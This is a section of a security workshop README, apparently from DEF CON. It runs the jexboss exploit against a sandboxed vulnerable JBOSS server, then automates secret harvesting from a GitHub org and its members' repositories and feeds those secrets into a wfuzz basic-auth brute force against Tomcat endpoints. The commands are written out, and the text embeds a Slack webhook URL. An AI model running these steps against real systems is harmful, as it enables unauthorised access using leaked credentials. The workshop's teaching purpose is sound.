# Section-4

## Table of Contents
<!-- TOC -->

- [Section-4](#section-4)
    - [Table of Contents](#table-of-contents)
    - [Overview](#overview)
    - [Stand up vulnerable and non-vulnerable JBOSS servers](#stand-up-vulnerable-and-non-vulnerable-jboss-servers)
    - [Stand up Attack Host with exploit tools](#stand-up-attack-host-with-exploit-tools)
    - [Using Attack Host to exploit](#using-attack-host-to-exploit)
    - [Destroying the environment](#destroying-the-environment)
    - [Switching context to minikube](#switching-context-to-minikube)
    - [Introducing Target, Attack Surface and Automated Testing Methodology](#introducing-target-attack-surface-and-automated-testing-methodology)

<!-- /TOC -->

## Overview
In this section, we will
1. Start a vulnerable and a non-vulnerable JBOSS server in our remote K8S cluster on GKE.
2. Start an attack host (with our exploit tools installed) in our remote K8S cluster on GKE.
3. Attack both the JBOSS servers from the attack host.
4. Destroy the JBOSS servers and the attack host.
5. Introduce the target, the attack surface exposed by that target and our automated testing methodology we will be using to attack that target.
6. Finally end the workshop by demo'ing the entire automation described above by issuing a single command from Slack using [Kubebot](https://github.com/anshumanbh/kubebot).


## Stand up vulnerable and non-vulnerable JBOSS servers
1. We will need to switch contexts from `minikube` to the remote GKE cluster. Type `kubectl config get-contexts` to display a list of clusters you can connect to and then type `kubectl config set-context <name of GCP cluster>` Be sure to choose the correct cluster by matching the name and zone from the steps above. Once this is done, verify the context was set correctly by typing `kubectl get nodes` and ensuring the correct nodes are shown. If this doesn't work, manually modify the `~/.kube/config` file as explained in the previous section.

2. Finding a pre-built docker image
    * On your local machine type `docker search jboss`
    * We'll be using `tutum/jboss`
    * To grab the latest version type `docker pull tutum/jboss:latest`
    * To grab a vulnerable version for testing type `docker pull tutum/jboss:as6` The designation of `:as6` grabs JBOSS version 6 as referenced [here](https://hub.docker.com/r/tutum/jboss/)

3. Getting the image ready to push to GCP
    * Once the image is pulled down you're going to want to tag the image to get it ready for GCP.  Type `docker images` to get a list of your local images.  Copy the Image ID of the tutum/jboss images with the tag of *latest* and type the following command `docker tag <Image ID> us.gcr.io/$PROJECT_ID/jboss-latest` replacing the <Image ID> with that of your own.  Now if you type `docker images` you should see your newly tagged images ready for GCP.
    * Repeat the step above for the as6 version labeling it `jboss-vulnerable:as6` - `docker tag <Image ID> us.gcr.io/$PROJECT_ID/jboss-vulnerable:as6`.
    * Now, we have to upload the images to the container registry in GCP. Type the following command to upload the newly tagged images to GCR: `gcloud docker -- push us.gcr.io/$PROJECT_ID/jboss-vulnerable:as6` and `gcloud docker -- push us.gcr.io/$PROJECT_ID/jboss-latest:latest`.

4. Starting the servers
    * Now that the images are in the container registry on GCP, we'll want to start them up and expose the proper ports.  To do that, type the following commands: `kubectl run jboss-latest --image=us.gcr.io/$PROJECT_ID/jboss-latest --port=8080` and `kubectl run vuln-jboss --image=us.gcr.io/$PROJECT_ID/jboss-vulnerable:as6 --port=8080`


## Stand up Attack Host with exploit tools
1. From the `attackhost` directory, type
    * `docker build -t us.gcr.io/$PROJECT_ID/attackhost .`
    * `gcloud docker -- push us.gcr.io/$PROJECT_ID/attackhost`
2. Navigate to Google Container Registry and verify the image exists.
3. Start the attackhost deployment by typing - `kubectl apply -f attack-host.yaml`


## Using Attack Host to exploit
1. SSH into the attackhost container by typing - `kubectl exec -it <pod-name> bash`.  You can get the name of the pod by running `kubectl get pods` and searching for the attackhost pod name.
2. Run `jexboss` by typing - `python jexboss.py -u <URL>` for both the vulnerable and non-vulnerable JBOSS servers.The URL can be found by navigating to the pods section, clicking on the pod and obtaining the ip address.  the URL will look something like this: `http://10.4.1.5:8080`
3. Notice the different output and the ease of standing up sandboxed environments for security testing.


## Destroying the environment
1. Delete all the deployments by typing - `kubectl delete deployments --all`
2. Delete all the pods by typing - `kubectl delete pods --all`
3. Deleting the remote K8S cluster on GKE - `gcloud alpha container clusters delete remote-cluster`


## Switching context to minikube
Let's switch back our context to minikube - `kubectl config set-context minikube`. Verify the context set is correct by typing `kubectl get nodes`


## Introducing Target, Attack Surface and Automated Testing Methodology
1. Domain:
    * Domain points to an Apache Tomcat server.
    * Domain has a github org with members.
2. We will scan all the repositories of this org and all the repositories of the org's members using the tool [git-all-secrets](https://github.com/anshumanbh/git-all-secrets). Results will be stored in a Google BigQuery table.
3. We will then run [wfuzz](https://github.com/xmendez/wfuzz) to do a focussed bruteforcing for Apache Tomcat endpoints on that domain. Results will be stored in a Google BigQuery table as well.
4. We will then use the secrets obtained from `git-all-secrets` and try to bruteforce the basic authentication mechanism of the Apache Tomcat endpoints obtained from `wfuzz`.
5. If there is a match, we will get back results in Slack via an incoming webhook.
6. Demo of doing all this auto-magically.

### Running locally
1. [Running git-all-secrets and wfuzz locally and converting the results to store in BigQuery](data-converter/README.md)
2. [Running wfuzz basic authentication bruteforcer combining the data from both the tools](wfuzz-basicauth-bruteforcer/README.md)

### Running on a local K8S cluster (Minikube)
Running the tools repo-supervisor and wfuzz
1. Replace the directory path `/path/where/gac/is/stored/` in the command below to the path where GAC credentials file is stored locally on your workstation. Replace the `PROJECTID` as well. Replace the `gacfilename` with the name of the GAC credentials file.

`docker run -it -v /path/where/gac/is/stored/:/tmp/data/ abhartiya/utils_bqps:v1 -project <PROJECTID> -gac /tmp/data/<gacfilename> -wfdataset wfuzzds -wftable wfuzz_tomcat_test -rsdataset reposupervisords -rstable reposupervisor_test`

The above command will mount the local directory where you stored your GAC credentials file to `/tmp/data` inside the container. Once, it does that, it will run the `abhartiya/utils_bqps:v1` container with the arguments - `-project defcon-workshop -gac /tmp/data/<gacfilename> -wfdataset wfuzzds -wftable wfuzz_tomcat_test -rsdataset reposupervisords -rstable reposupervisor_test`. Once the container runs, it will re-create the dataset and tables.

2. `kubectl create secret generic googlesecret --from-file=$(CREDS_FILEPATH)` - Create a secret with the value of the secret being the JSON credentials file downloaded above. We need this because the containers on the cluster need to authenticate to our K8S cluster to be able to create anything.
3. `kubectl get secrets` - Verify the secret was created.
4. Make sure the environment values in the `deployments/tools-bq-pod.yaml` deployment file are accurate.
5. Start the pods by typing `kubectl apply -f deployments/tools-bq-pod.yaml`.

Running the wfuzz basic authN bruteforcer
1. Make sure the environment values in the `deployments/tools-wfbrute-pod.yaml` deployment file are accurate.
2. Start the pod by typing `kubectl apply -f deployments/tools-wfbrute-pod.yaml`

### Cleanup
1. `kubectl delete pods --all`
2. Delete the BQ datasets and tables
9. `minikube delete`

### Demo - Sending a request from Kubebot for a target company
1. Initiate a request from Slack by typing a command like `/runautomation wfuzzbasicauthbrute|defcon.kubebot.io`.
2. API server receives the request.
3. API server drops a message in the queue to start `wfuzzbasicauthbrute` tool.
4. The message is picked up by a subscription worker from the queue.
5. Subscription worker starts 2 GoRoutines:
    * First GoRoutine starts [gitallsecrets](https://github.com/anshumanbh/git-all-secrets) with the options `-token <> -org kubebot -toolName repo-supervisor -output /tmp/results/results.json`. As soon as this is finished, the results are uploaded to BigQuery in the table `reposupervisor_test` under the dataset `reposupervisords` by the help of a utility [converttobq](https://hub.docker.com/r/abhartiya/utils_converttobq/).
    * Second GoRoutine starts [wfuzz](https://github.com/anshumanbh/wfuzz) with the options `-w /data/SecLists/Discovery/Web_Content/tomcat.txt --hc 404,429,400 -o csv http://defcon.kubebot.io/FUZZ/ /tmp/results/results.csv`. As soon as this is finished, the results are uploaded to BigQuery in the table `wfuzz_tomcat_test` under the dataset `wfuzzds` by the help of a utility [converttobq](https://hub.docker.com/r/abhartiya/utils_converttobq/).
    * All the above jobs are performed inside Docker containers and they are destroyed once they are all completed.
6. After the tools finish running above, the subscription worker starts another GoRoutine:
    * This GoRoutine starts a utility [wfuzzbasicauthbrute](https://hub.docker.com/r/abhartiya/utils_wfuzzbasicauthbrute/) with the opttions `-target defcon.kubebot.io -slackHook https://hooks.slack.com/services/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`.
    * This utility basically fetches all the secrets obtained from the `reposupervisor_test` table and stores it in a file. It then fetches all the endpoints obtained from the table `wfuzz_tomcat_test`.
    * For each endpoint retrieved above, the utility does a bruteforce attack against the basic authentication mechanism with all the secrets retrieved above against the URL `http://TARGET/ENDPOINT`. This is done by using the tool [wfuzz](https://github.com/xmendez/wfuzz) with the options `./wfuzz.py -w <all-the-secrets-file> -o csv --basic "admin:FUZZ" --sc 200,403 http://TARGET/ENDPOINT`
    * Finally, for each response with a `200` or `403` status, indicating that the secret worked against that endpoint, the results are sent back to Slack via the incoming Slack webhook.
